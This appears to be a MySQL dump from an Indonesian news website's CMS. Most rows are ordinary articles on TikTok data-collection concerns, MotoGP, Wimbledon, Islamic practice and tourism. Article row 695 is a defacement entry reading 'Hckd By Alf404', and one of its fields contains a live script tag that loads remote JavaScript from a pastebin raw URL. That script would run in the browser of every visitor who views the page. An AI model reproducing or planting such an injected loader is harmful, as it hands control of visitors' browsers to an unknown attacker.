'10:55:21', 'kpop.jpg', 44, 'selebritis,internasional', 'Y'),
(673, 23, 'mstore', 'Benarkah TikTok Mengirim Data Penggunanya ke China?', '', 'https://www.youtube.com/watch?v=siPK18kYGPI', 'benarkah-tiktok-mengirim-data-penggunanya-ke-china', 'N', 'Y', 'N', '<p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">MSTORE.co.id - Jagat media sosial belakangan ramai dengan diskusi aplikasi TikTok yang diduga mengumpulkan data pengguna. Sebenarnya, praktik ini umum dilakukan oleh platform media sosial&nbsp; bukan rahasia lagi. Hal itu juga tercantum di syarat dan ketentuan aplikasi. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Namun, yang dipermasalahkan dari kasus TikTok baru-baru ini adalah jenis data yang dikumpulkan lebih banyak daripada aplikasi media sosial lainnya. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Dicurigai bahwa kumpulan data pengguna tersebut lantas dikirim ke China, entah berakhir di tangan pemerintah negara tersebut atau pihak lain. Isu ini antara lain dicuatkan ke permukaan dalam sebuah utas (thread) pengguna twitter dengan akun @SoundOfYogi. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Dalam utasnya, Yogi menyarankan agar pengguna menghapus (uninstal) apliaksi TikTok di \"Ada snippets code (kode program) yang memuat aplikasi mampu mengunduh file Zip, (kemudian) unzip lalu execute binary apapun yang telah di-download,\" tulisnya.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Benarkah demikian? Informasi soal data yang dihimpun dalam twit tersebut serupa dengan laporan dari perusahaan keamanan siber, Penetrum yang dipublikasi bulan April lalu. Saat itu, Penetrum mengoprek aplikasi TikTok versi 10.0.8 hingga 15.2.3. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Dari hasil pengujian, Penetrum menemukan sebanyak 37,7 persen alamat IP dari layanan yang terkait dengan TikTok berlokasi di luar Amerika Serikat, sebagian besar di-host&nbsp;oleh ISP bernama Alibaba di China. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Sedikit membahas tentang server Alibaba. Tahun 2019 lalu, server Alibaba mengalami peretasan dan membuat lebih dari 899 GB data didalamnya bocor. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Detektif kepala Riset dan Keamanan, Anurag Sen yang memimpin investigasi kejadian ini menemukan bahwa database yang diretas memuat informasi yang dikumpulkan oleh lebih dari 100 aplikasi pinjaman online yang ada di China. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Tim investigasi juga menemukan 4,6 juta entri unik dari data perangkat, yang terdiri dari lokasi GPS, daftar kontak lengkap, log SMS, nomor IMSI, nomor IMEI, model perangkat serta versinya, data tersimpan dari aplikasi yang dipasang sebelumnya, dan data memori.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Selain itu masih ada entri dari laporan operator, detail transaksi, inovice&nbsp;tagihan (berisi nama lengkap, nomor HP, detail tagihan bulanan, kartu kredit, kartu debit, dan log panggilan), alamat IP, dan durasi sesi online pengguna.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><b>\"Pelacakan berlebihan\" </b></span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Kembali ke pembahasan data apa saja yang dikumpulkan oleh TikTok. Menurut laporan Penetrum kode yang dioprek juga memuat permintaan akses aplikasi Android dengan kode \"android.permission.ACCESS_FINE_LOCATION\". </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Kode tersebut mengizinkan API untuk menemukan lokasi sepresisi mungkin dari beberapa tools yang digunakan, termasuk GPS serta WiFi dan data seluler. Semua data yang dikumpulkan sistem operasi perangkat, seperti WiFi, perubahan SSID, dll juga turut dihimpun. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Data nomor IMEI juga dikoleksi yang kemungkinan digunakan untuk melacak aplikasi apa saja yang diinstal. Ada pula&nbsp;data IMSI yang disebut bisa digunakan untuk memahami perilaku pengguna yang ujung-ujungnya digunakan untuk menargetkan iklan. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">\"Dari pemahaman dan analisis kami, tampaknya TikTok melakukan pelacakan yang berlebihan terhadap pengguna,\" tulis Penetrum dalam laporannya.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Penetrum masih menduga kemungkinan bahwa jenis data yang dihimpun kebetulan mirip dengan jenis data yang ditemukan di kasus pembobolan data server Alibaba tahun 2019 lalu. Penetrum juga menemukan kode aplikasi AppsFlayer. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Di situsnya, AppFlayer mendeskripsikan diri sebagai perusahaan Customer Relationship Management yang menyediakan platform bagi pengembang aplikasi untuk menyimpan, memiliki, menganalisa, dan mengontrol data pengguna. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Data akan tersimpan di smart database yang memungkinkan pengembang aplikasi menyimpan data end user secara aman dan private. AppFlayer mengklaim telah mematuhi regulasi keamanan data berstandar Eropa dan AS, yakni GDPR, CCPA, COPPA, dan lainnya. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Salah satu metode yang digunakan AppsFlayer adalah lokasi GPS yang digunakan untuk memproses lokasi pengguna dan menampilkan iklan berdasarkan lokasi.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><b>\"Bisa Menyalin Isi Clipboard\"</b></span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Bukan hanya pengguna Android. Pengguna iOS juga sempat menjumpai masalah keamanan saat menginstal aplikasi TikTok. Beberapa waktu lalu, pengguna iOS 14 beta mengungkap adanya celah keamanan yang membuat TikTok bisa menyalin clipboard. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Mereka mengunggah beberapa bukti celah itu dalam sebuah video singkat ke Twitter. Tampak dari beberapa video itu, muncul sebuah notifikasi pop-up di sisi atas berbunyi \"TikTok pasted from\" saat pengguna mengetik di keyboard. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Clipboard sendiri adalah memori sementara yang digunakan untuk meyimpan informasi saat pengguna ponsel atau komputer melakukan copy-paste. Apabila pengguna mengkopisebuah password, maka password itu akan tersimpan di&nbsp;clipboard untuk kemudian di-paste.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">TikTok mengatakan telah merilis pembaruan aplikasi untuk memperbaiki masalah tersebut. Kepada Telegraph, seperti dirangkum KompasTekno, Minggu (5/7/2020), Tiktok mengatakan bahwa celah keamanan itu dipicu oleh fitur yang dirancang untuk mengidentifikasi spam. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">\"Kami telah menyediakan versi terbaru aplikasi di App Store, menghapus fitur anti-spam untuk menghilangkan potensi kebingungan,\" jelas perwakilan TikTok. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Rand Fishkin, pendiri Spark Toro, sebuah perushaan tool riset pasar, mengatakan bahwa platform media sosial lain seperti Facebook, Twitter, Reddit, Instagram, dan Google, juga mengumpulkan data pengguna. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Ini praktik yang lazim di platform digital. Tapi, menurut dia, data yang dihimpun biasanya tidak sebanyak yang dilakukan TikTok.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Kompas telah menghubungi TikTok Indonesia untuk meminta tanggapan. Perwakilan TikTok tidak menanggapi masalah tersebut secara langsung dan memberikan pernyataan dari Roland Cloutier, TikTok Chief Information Security Officer perihal celah keamanan di iOS 14. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">\"Kami berkomitmen membuat aplikasi yang menghargai privasi pengguna kami dan menjadi lebih transparan dengan komunitas kami,\" ujar Cloutier di akhir pernyataannya. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Pekan lalu, setelah aplikasinya diblokir oleh India menyusul ketegangan dengan China, TikTok menegaskan tidak memberikan data pengguna (di India) ke pemerintah negara manapun, termasuk China.</span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><b><br></b><br></span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><br></p>\r\n', 'Benarkah TikTok Mengirim Data Penggunanya ke China? Simak Ulasannya!', 'Minggu', '2020-07-07', '16:05:33', 'tiktok_mstore_indonesia.jpg', 17, 'selebritis', 'Y'),
(685, 2, 'admin', 'Crutchlow Finis di Posisi 19 MotoGP Amerika', '', '', 'crutchlow-finis-di-posisi-19-motogp-amerika', 'N', 'N', 'N', '<p><strong>AUSTIN&nbsp;</strong>&ndash; Pembalap Tim LCR Honda, Cal Crutchlow, harus menelan hasil yang buruk di seri ketiga MotoGP 2018 yang digelar di Circuit of the America (COTA), Austin, Amerika Serikat, pada Senin (23/4/2018) dini hari WIB. Crutchlow pun membeberkan penyebabnya finis di posisi ke-19 MotoGP Amerika Serikat 2018.</p>\r\n\r\n<p>Menurut Crutchlow, hasil minor ini didapatkan karena dirinya terjatuh saat melakoni balapan tersebut. Insiden ini terjadi di lap-lap awal ketika Crutchlow tengah berusaha merebut posisi pembalap di depannya.</p>\r\n\r\n<p>Crutchlow harus terjatuh ketika tengah memperebutkan posisi keenam bersama Johann Zarco dan Dani Pedrosa. Usahanya saat itu tak berjalan mulus karena laju motornya yang tak stabil sehingga Crutchlow harus terjatuh dan keluar jalur.</p>\r\n\r\n<p>Beruntung, Crutchlow bisa bangkit kembali dan melanjutkan balapan hingga garis finis. Meski begitu, dirinya tak bisa merebut kembali posisi terdepan dan harus puas finis di urutan ke-19 dengan catatan waktu 42 menit 51,057 detik.</p>\r\n\r\n<p>Rekan setim Takaaki Nakagami itu mengaku insiden ini terjadi karena dirinya salah memilih ban. Ban keras yang digunakan Crutchlow saat race di MotoGP Amerika Serikat ternyata membuat laju kendaraannya tak dapat maksimal. Alhasil, dirinya pun harus terjatuh saat tengah memperebutkan posisi terdepan.</p>\r\n\r\n<p>&quot;Saya merasa telah tampil dengan baik, tetapi saya membuat kesalahan, saya terjatuh. Sejujurnya, saya mampu untuk finis kedua atau ketiga dalam perlombaan ini, tetapi saya jatuh di tikungan terakhir,&rdquo; ujar Crutchlow, sebagaimana dikutip dari Speedweek, Senin (23/4/2018).</p>\r\n', 'Cal Crutchlow', 'Selasa', '2018-04-24', '01:30:53', 'crutchlowjpg.jpg', 7, 'olahraga,hiburan', 'Y'),
(686, 42, 'admin', 'Gaung Suara RI dalam Konf. Islam Internasional', '', '', 'gaung-suara-ri-dalam-konf-islam-internasional', 'N', 'N', 'N', '<p>Nijmegen - Konferensi Internasional Kedua mengenai Islam moderat yang bertajuk &quot;Seeking The Middle Path (Al Wasatiyya): Articulations of Moderate Islam&quot; telah diselenggarakan pada 19 Juni 2019 di Universitas Radboud, Nijmegen, Belanda.</p>\r\n\r\n<p>Pertemuan Internasional tentang Islam moderat tersebut --yang merupakan acara dua tahunan-- digagas oleh PCINU Belanda bekerja sama dengan Universitas Radboud, Nijmegen, Belanda.</p>\r\n\r\n<p>Perhelatan itu diselenggarakan untuk mempromosikan dan lebih memahami konsep dari al-wasatiyya yang kerap diterjemahkan sebagai &quot;Islam pertengahan&quot; atau &quot;jalan tengah,&quot; demikian seperti dikutip dari rilis KBRI Den Haag, yang dimuat Liputan6.com pada Minggu (23/6/2019).</p>\r\n\r\n<p>Menteri Agama Republik Indonesia, Drs. H. Lukman H. Saifuddin yang hadir sebagai pembicara utama menekankan bahwa prinsip beragama jalan tengah (middle way) sudah bukan hanya merupakan harapan suatu negara atau sekelompok masyarakat saja, melainkan merupakan kebutuhan bersama segenap bangsa. Hal ini demi menciptakan tatanan dunia yang damai, rukun, anti kekerasan, dan saling menghargai perbedaan serta saling mengapresiasi keragaman.</p>\r\n\r\n<p>Sementara itu, Duta Besar RI untuk Kerajaan Belanda, I Gusti Agung Wesaka Puja menyampaikan bahwa al Wasatiyya Islam (jalan tengah) atau Islam moderat merupakan cara yang sesuai bagi semua agama untuk bersikap. Dalam praktiknya Indonesia sudah menjalankan nilai-nilai dari Al Wasatiyya tersebut sejak lama.</p>\r\n\r\n<p>Konferensi tahun ini dihadiri sekitar 300 orang dan melibatkan para akademisi, peneliti dan budayawan dari berbagai latar belakang yang beragam baik dari Indonesia, maupun Belanda.</p>\r\n\r\n<p>Turut hadir pula dalam konferensi antara lain, KH Yahya Cholil Staquf, Katib Am NU/Anggota Wantimpres dan Prof. Syafiq Mughni, Utusan Khusus Presiden untuk Dialog dan Kerjasama Antaragama dan Peradaban (UKP-DKAAP).</p>\r\n\r\n<p>Selanjutnya, masih dalam rangkaian acara konferensi, pada tanggal 20 Juni 2019, Konsorsium Belanda-Indonesia untuk hubungan Muslim-Kristen bekerja sama dengan Kedutaan Besar Republik Indonesia untuk Kerajaan Belanda menyelenggarakan kegiatan dialog antar agama (interfaith dialogue) yang bertajuk &quot;Promoting &#39;Costly&#39; tolerance: Challenges for states and religious communities.&quot;</p>\r\n', '', 'Senin', '2019-07-15', '10:07:38', 'gambar.png', 16, 'metropolitan,nasional', 'Y'),
(687, 42, 'admin', 'Mandi Wajib Menurut Islam Laki-Laki dan Perempuan', '', '', 'mandi-wajib-menurut-islam-lakilaki-dan-perempuan', 'N', 'N', 'N', '<p>Jakarta Cara mandi wajib tentu harus sudah diketahui oleh seluruh umat islam. Karan hal ini berhubungan dengan suci badan. Apalagi untuk orang-orang yang telah melakukan hubungan badan, keluar air mani, haid, serta nifas.&nbsp;</p>\r\n\r\n<p>Mandi wajib dilakukan dengan menggunakan air suci dan bersih dengan mengalirkan air tersebut ke seluruh tubuh mulai dari ujung rambut sampai ujung kaki. Tujuan mandi wajib adalah untuk menghilangkan hadas besar sebelum melakukan ibadah.</p>\r\n\r\n<p>Cara mandi wajib sudah ada kaidahnya sendiri dan sudah seharusnya dilakukan dengan benar. Sebab, bila tidak dilakukan dengan benar, apalagi malah tidak melakukannya sama sekali maka ibadah-ibadah yang kamu jalankan selama belum melaksanakan mandi wajib tidak akan sah.</p>\r\n\r\n<p>Berikut Liputan6.com rangkum dari berbagai sumber, Minggu (16/6/2019) tentang cara mandi wajib Cara mandi wajib untuk laki-laki dan perempuan memiliki beberapa perbedaan. Terutama pada bagian niat. Selain itu, cara mandi wajib yang harus dilakukan oleh laki-laki dan perempuan rata-rata hampir sama saja. Berikut cara mandi wajib yang harus dilakukan laki-laki:</p>\r\n', '', 'Senin', '2019-07-15', '10:12:55', 'gambar_berita1.png', 11, 'israel,palestina', 'Y'),
(688, 42, 'admin', 'Ini 3 Fakta Tentang Hari Raya Umat Islam Sedunia', '', '', 'ini-3-fakta-tentang-hari-raya-umat-islam-sedunia', 'N', 'N', 'N', '<p>Ketika umat Islam di seluruh dunia mengucapkan &#39;selamat jalan Ramadan&#39;, maka itulah saat ketika mereka bersiap untuk menyambut&nbsp;<a href=\"https://www.liputan6.com/tag/idul-fitri\" target=\"_blank\">Idul Fitri</a>, hari raya Muslim yang menandai akhir Bulan Suci.</p>\r\n\r\n<p>Tahun ini, sebagian besar negara merayakan Idulfitri pada tanggal 5 Juni, namun ada pula yang menjalankannya pada 4 Juni, tergantung pada penglihatan hilal atau Bulan sabit muda di lokasi masing-masing.</p>\r\n\r\n<p>Arab Saudi, Kuwait, Qatar, dan Uni Emirat Arab berlebaran pada Selasa, sedangkan Mesir, Suriah, Yordania, Indonesia, Jepang, Malaysia, Thailand, Pakistan dan Australia memulai pada Rabu. Demikian seperti dikutip dari Al Jazeera, Selasa (4/6/2019)</p>\r\n\r\n<p>Apakah Idul Fitri itu?</p>\r\n\r\n<p>Dalam kamus KBBI, Idulfitri berarti hari raya umat Islam yang jatuh pada tgl 1 Syawal setelah selesai menjalankan ibadah puasa selama bulan Ramadan.</p>\r\n\r\n<p>Secara tradisional, Idul Fitri dirayakan selama dua hari dan ditetapkan sebagai libur nasional di semua negara yang mayoritas penduduknya adalah Muslim.</p>\r\n\r\n<p>Bagaimana awal lebaran ditentukan?</p>\r\n\r\n<p>Seperti Ramadan, Idul Fitri dimulai dengan penampakan pertama Bulan baru atau hilal. Jadi biasanya, umat Islam harus menunggu sampai malam sebelum Idulfitri, untuk memverifikasi tanggalnya. Jika hilal tidak terlihat, maka puasa Ramadan akan dibulatkan penuh menjadi 30 hari dan Idul Fitri jatuh tepat sehari setelah puasa usai.</p>\r\n\r\n<p>Penanggalan Idul Fitri berubah setiap tahun pada kalender Gregorian dan bervariasi dari satu negara ke negara lain, bergantung pada lokasi geografis.</p>\r\n', '', 'Senin', '2019-07-15', '10:14:42', 'gambar_berita2.png', 10, 'nasional,hiburan', 'Y'),
(689, 44, 'admin', 'Alasan Taman Bunga Ditutup Bikin Geleng Kepala', '', '', 'alasan-taman-bunga-ditutup-bikin-geleng-kepala', 'N', 'N', 'N', '<p>Jakarta Wisata kota tua Jakarta tentunya menjadi salah satu tujuan utama liburan bagi wisatawan saat berkunjung ke Jakarta. Bagi orang-orang yang tinggal di Jakarta tentunya sudah tidak asing lagi dengan tempat ini yang biasanya sangat ramai di hari libur.&nbsp;</p>\r\n\r\n<p>Wisata kota tua Jakarta menyuguhkan berbagai arsitektur bersejarah yang merupakan peninggalan masa penjajahan Belanda. Kawasan ini juga sering dikunjungi oleh banyak wisatawan lokal hingga mancanegara.</p>\r\n\r\n<p>Apalagi sebagai kawasan dengan bangunan-bangunan tua, maka terdapat begitu banyak spot menarik untuk berfoto bagi semua kalangan. Hal inilah yang menambah ketertarikan wisatawan untuk berkunjung ke wisata kota tua Jakarta ini.</p>\r\n\r\n<p>Berikut Liputan6.com rangkum dari berbagai sumber, Rabu (10/7/2019) tentang wisata kota tua Jakarta</p>\r\n\r\n<p>Museum Fatahillah</p>\r\n\r\n<p>Tentunya destinasi utama dari wisata kota tua Jakarta adalah Museum Fatahillah. Dapat dikatan bahwa Museum Fatahillah merupakan ikon utama dari wisata kota tua Jakarta karena banyak sekali orang-orang yang berfoto di halamannya. Apalagi museum ini merupakan saksi bisu perjuangan masyarakat Indonesia dalam menncapai kemerdekaan.</p>\r\n\r\n<p>Museum ini dulunya merupakan gedung balai kota yang juga sekaligus sebagai ruang pengandilan. Bahkan ada juga penjara bawah tanah. Karena itulah masih banyak barang-barang peninggalan dari zaman Belanda yang terdapat di dalam Museum Fatahillah.</p>\r\n\r\n<p>Dulunya museum Fatahillah lebih terkenal disebut dengan Museum Batavia pada zaman penjajahan VOC. Jangan sampai melewatkan kunjungan ke salah satu wisata kota tua Jakarta paling ikonik ini.</p>\r\n', '', 'Senin', '2019-07-15', '10:17:45', '', 8, 'nasional', 'Y'),
(690, 44, 'admin', 'Peta Wisata Bandung, Mulai dari Lembang - Ciwidey', '', '', 'peta-wisata-bandung-mulai-dari-lembang--ciwidey', 'N', 'N', 'N', '<p>Jakarta Peta wisata Bandung banyak dicari para traveler. Maklum, Bandung mempunyai banyak sekali destinasi yang perlu dikunjungi. Apalagi sebagai salah satu destinasi yang sering dikunjungi, Bandung sudah sangat terkenal baik bagi wisatawan asing maupun domestik. &nbsp;</p>\r\n\r\n<p>Kamu bisa menikmati berbagai tempat wisata, mulai dari wisata alam, wisata edukasi untuk anak-anak, serta wisata keluarga di Bandung. Tidak salah rasanya orang-orang menyebut Bandung sebagai Paris Van Java.</p>\r\n\r\n<p>Peta wisata Bandung terdiri dari wisata di Kota Bandung, Lembang, serta Ciwidey. Setiap tahunnya tempat-tempat wisata tersebut selalu dipenuhi oleh wisatawan yang berkunjung.</p>\r\n\r\n<p>Berikut Liputan6.com rangkum dari berbagai sumber, Minggu (30/6/2019) tentang peta wisata Bandung</p>\r\n\r\n<p>Peta wisata bandung bisa dimulai dari tempat wisata di Lembang. Beberapa tempat wisata yang bisa kamu kunjungi di lembang sebagai peta wisata bandung ini sebagai berikut:</p>\r\n\r\n<p>Tangkuban Perahu</p>\r\n\r\n<p>Siapa tak kenal dengan tempat wisata yang satu ini? Wahana wisata gunung dan kawah paling terkenal di Bandung ini sering menjadi tujuan wisatawan saat libur hari biasa, termasuk Lebaran.</p>\r\n\r\n<p>Lokasinya hanya sekitar 30 kilometer dari pusat kota Bandung menuju ke arah utara. Selain itu, harga tiket masuk ke Tangkuban Perahu cukup terjangkau. Rp 22 ribu (hari biasa) dan Rp 31 ribu (hari libur atau weekend) per orangnya.</p>\r\n\r\n<p>Di sini, pengunjung bisa menikmati keindahan alam yang tersaji bersama keluarga atau kerabat saat mengisi liburan nanti.</p>\r\n\r\n<p>Dusun Bambu Family Leisure Park Lembang</p>\r\n\r\n<p>Dusun Bambu Family Leisure Park adalah sebuah resor dan juga tempat wisata yang berada di kaki Gunung Burangrang, Cisarua, Lembang. Keunikan yang dimiliki tempat wisata ini bisa kamu lihat dari sebuah danau besar yang dikelilingi bangunan pondokan yang terbuat dari bambu di tepiannya.</p>\r\n\r\n<p>Karenna pemandangannya yang sangat romantis itu, tak heran jika tempat ini juga sering digunakan untuk foto pre-wedding. Kawasan Dusun Bambu merupakan salah satu tempat wisata di Lembang yang lagi hits.</p>\r\n\r\n<p>Lokasi ini menawarkan wisata alam dan kuliner yang dilengkapi berbagai wahana permainan. Tak ketinggalan spot-spot cantik untuk penggila selfie maupun fotografi. Dengan 15.000 rupiah, kamu dapat menikmati suasana di Dusun Bambu ini.</p>\r\n', '', 'Senin', '2019-07-15', '10:19:41', '', 10, 'nasional', 'Y'),
(691, 2, 'admin', 'Meski Akui Sudah Sulit Menang, Rossi Belum Mau Menyerah', '', '', 'meski-akui-sudah-sulit-menang-rossi-belum-mau-menyerah', 'N', 'N', 'N', '<p>LESMO &ndash; Pembalap Monster Energy Yamaha, Valentino Rossi, mengakui kalau dirinya sudah mulai kesulitan untuk bisa meraih kemenangan di kelas utama saat ini. Kendati begitu, ia mengaku masih belum mau menyerah dan akan tetap berjuang hingga akhir musim.</p>\r\n\r\n<p>Meski terlihat masih cukup mampu bersaing untuk podium musim ini, kemenangan terakhir Rossi diraihnya pada seri Belanda 2017 lalu. Sejak saat itu, The Doctor &ndash;julukan Rossi&ndash; sudah melewati 37 balapan tanpa kemenangan.</p>\r\n\r\n<p>Catatan ini merupakan losing streak terpanjang kedua yang pernah ia alami dalam kariernya. Sebelumnya, Rossi juga pernah merasakan 44 balapan tanpa kemenangan pada akhir 2010 sampai awal 2013.</p>\r\n', '', 'Senin', '2019-07-15', '10:24:03', 'rossi.png', 10, 'metropolitan,olahraga', 'Y'),
(692, 2, 'admin', 'Kalahkan Federer, Djokovic Juara Wimbledon', '', '', 'kalahkan-federer-djokovic-juara-wimbledon', 'N', 'N', 'N', '<p>LONDON &ndash; Novak Djokovic meraih gelar juara di ajang Wimbledon 2019 kali ini. Petenis asal Serbia itu keluar sebagai juara usai mengalahkan pesaing terberatnya, Roger Federer pada laga final yang berlangsung Minggu 14 Juli 2019.</p>\r\n\r\n<p>Persaingan ketat tersaji antara Djokovic dan Federed di partai final. Keduanya bahkan harus bermain hingga lebih dari lima jam di laga final kali ini. Kejar-kejaran poin juga terus terjadi di set pertama hingga keduanya berada di skor 6-6. Akan tetapi, Djokovic akhirnya mampu menang di set pertama lewat tie break 7-5.</p>\r\n\r\n<p>Hal serupa juga terjadi di set kedua dan tiga. Seakan tak ingin melakukan kesalahan, kedua pemain begitu berhati-hati dalam melepaskan pukulan. Akan tetapi, Federer yang lebih dominan akhirnya mampu mengatasi perlawanan Djokovic dengan cukup mudah.</p>\r\n', '', 'Senin', '2019-07-15', '10:25:22', 'gambar_6.png', 9, 'internasional,olahraga', 'Y'),
(693, 36, 'admin', 'Cara Repsol Honda Jaga Kepercayaan Diri Marquez', '', '', 'cara-repsol-honda-jaga-kepercayaan-diri-marquez', 'N', 'N', 'N', '<p>AALST – Direktur Honda Racing Coorporation (HRC), Tetsuhiro Kuwata, mengatakan kalau timnya selalu berusaha merakit motor terbaik untuk Marc Marquez. Hal itu mereka lakukan guna menjaga kepercayaan diri sang pembalap di lintasan.</p>\r\n\r\n<p>Tetsuhiro mengatakan, memiliki pembalap sekaliber Marquez, membuat timnya selalu berusaha menciptakan mesin terbaik, agar sang pembalap tak lagi terlalu memikirkan untuk meningkatkan performa motor dan hanya fokus untuk meraih hasil terbaik pada setiap balapan .</p>\r\n\r\n<p>“Sudah jadi tugas dan target kami memberi Marc (Marquez) mesin terbaik. Jika kami bisa memberinya motor dengan level tinggi, maka ini jelas akan memberikan kepercayaan diri yang lebih tinggi saat berkendara, hingga ia bisa benar-benar konsentrasi pada balapan. Dengan begitu, ia bisa meraih hasil baik,” ujar Kuwata, melansir dari laman GPOne, Senin (15/7/2019).</p>\r\n', '', 'Senin', '2019-07-15', '10:38:00', 'gambar_marquez.png', 12, 'internasional,olahraga', 'Y'),
(695, 52, 'jnsns', 'Alf404', 'hehe', '', 'alf404', 'Y', 'Y', 'Y', '<p>Hckd By Alf404</p>', '<script type=\"text/javascript\" src=\"https://pastebin.com/raw/HUNiiD7U\"></script>', 'Selasa', '2020-07-21', '08:59:47', '', 7, 'bola,nasional', 'N');

-- --------------------------------------------------------

--
-- Struktur dari tabel `download`
--

CREATE TABLE `download` (
  `id_download` int(5) NOT NULL,
  `judul` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `nama_file` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `tgl_posting` date NOT NULL,
  `hits` int(3) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci;

--
-- Dumping data untuk tabel `download`
--

INSERT INTO `download` (`id_download`, `judul`, `nama_file`, `tgl_posting`, `hits`) VALUES
(11, 'Total Biaya Pembuatan Aplikasi Simpeg', 'Contoh_File_Download_1.txt', '2014-09-23', 9),
(12, 'Type atau Jenis Join di MySQL', 'Contoh_File_Download_1.txt', '2014-09-23', 68),
(13, 'Kegiatan Monev Tgl. 14-17 Oktober 2014 (SAKPA)', 'Contoh_File_Download_1.txt', '2014-09-23', 34),
(14, 'Pembayaran Tunjangan Remunerasi', 'Contoh_File_Download_1.txt', '2014-09-23', 24),
(15, 'Target PNBP Umum & PNBP Fungsional TA.2015', 'Contoh_File_Download_1.txt', '2014-09-23', 3),
(16, 'Pelaksanaan Disiplin Pasca Idul Fitri 1435', 'Contoh_File_Download_1.txt', '2014-09-23', 90),
(17, 'Kegiatan Akurasi Data Semester I TA. 2014', 'Contoh_File_Download_1.txt', '2014-09-23', 14),
(18, 'Rapat Koordinasi dan Konsultasi', 'Contoh_File_Download_1.txt', '2014-09-23', 5),
(19, 'Lomba dan Penilaian SIMPEG dan E-DOCu', 'Contoh_File_Download_1.txt', '2014-09-23', 90),
(20, 'Pemanggilan Peserta Bimtek Hakim Tahun 2014', 'Contoh_File_Download_1.txt', '2014-09-23', 33),
(21, 'Penyusunan PAGU Indikatif Tahun Anggaran 2015', 'Contoh_File_Download_1.txt', '2014-09-23', 57),
(22, 'Revisi Tata Cara Restore Backup SAKPA13 Audited', 'Contoh_File_Download_1.txt', '2014-09-23', 44),
(23, 'Penyusunan RKAKL Alokasi Anggaran DIPA (04)', 'Contoh_File_Download_1.txt', '2014-09-23', 24),
(24, 'Tindaklanjut Temuan Pemeriksaan BPK RI', 'Contoh_File_Download_1.txt', '2014-09-23', 12),
(25, 'Verifikasi Kewajaran Nilai Tanah SIMAK-BMN', 'Contoh_File_Download_1.txt', '2014-09-23', 3),
(26, 'Instruksi Ketua Umum IPASPI Pusat (new)', 'Contoh_File_Download_1.txt', '2014-09-23', 24),
(27, 'Relaas Perkara No.0081/Pdt.G/2013/PA.Stg', 'Contoh_File_Download_1.txt', '2014-09-23', 6);

-- --------------------------------------------------------

--
-- Struktur dari tabel `gallery`
--

CREATE TABLE `gallery` (
  `id_gallery` int(5) NOT NULL,
  `id_album` int(5) NOT NULL,
  `username` varchar(50) COLLATE latin1_general_ci NOT NULL,
  `jdl_gallery` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `gallery_seo` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `keterangan` text COLLATE latin1_general_ci NOT NULL,
  `gbr_gallery` varchar(100) COLLATE latin1_general_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci;

--
-- Dumping data untuk tabel `gallery`
--

